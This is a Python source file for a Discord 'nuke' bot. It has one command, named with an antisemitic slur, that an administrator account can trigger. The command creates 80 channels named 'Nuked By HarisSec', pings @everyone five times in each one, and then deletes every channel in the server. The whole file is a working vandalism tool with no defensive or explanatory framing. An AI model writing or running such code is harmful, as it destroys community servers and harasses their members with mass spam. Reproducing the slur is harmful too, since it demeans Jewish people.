import discord
from discord.ext import commands
import os
import asyncio

TOKEN = os.environ["DISCORD_TOKEN"]
intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
bot = commands.Bot(command_prefix=".", intents=intents)

@bot.event
async def on_ready():
    print(f"Logged in as {bot.user}")

@bot.command()
@commands.has_permissions(administrator=True)
async def jew(ctx):
    await ctx.send("Starting nuke...")
    
    # Create 80 channels
    channels = []
    for i in range(80):
        try:
            channel = await ctx.guild.create_text_channel(f"Nuked By HarisSec")
            channels.append(channel)
            print(f"Created channel {i+1}/80")
        except Exception as e:
            print(f"Error creating channel: {e}")
    
    # Spam @everyone 5 times in each channel at fast speed
    for channel in channels:
        for j in range(5):
            try:
                await channel.send("@everyone")
                await asyncio.sleep(0.1)  # Fast speed - minimal delay
            except Exception as e:
                print(f"Error sending message: {e}")
    
    await asyncio.sleep(1)
    
    # Delete all channels
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
            print(f"Deleted channel: {channel.name}")
        except Exception as e:
            print(f"Error deleting channel: {e}")
    
    await ctx.send("Nuke complete!")

bot.run(TOKEN)
